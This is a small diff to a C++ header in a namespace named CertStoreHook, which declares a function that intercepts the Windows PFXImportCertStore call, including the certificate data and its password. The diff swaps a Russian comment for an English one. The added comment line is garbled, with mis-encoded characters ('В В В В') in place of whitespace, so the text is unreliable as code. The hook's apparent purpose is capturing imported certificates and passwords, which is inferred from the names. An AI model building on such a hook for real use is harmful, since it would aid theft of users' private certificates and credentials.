@@ -32,8 +32,7 @@ namespace CertStoreHook
   */
   bool _clearMy(void);
   
-  /*
-    Перехватчик PFXImportCertStore.
-  */
+  /*В В В В Interceptor PFXImportCertStore.
+В В */
   void * WINAPI _hookerPfxImportCertStore(CRYPT_DATA_BLOB *data, LPCWSTR password, DWORD flags);
 };
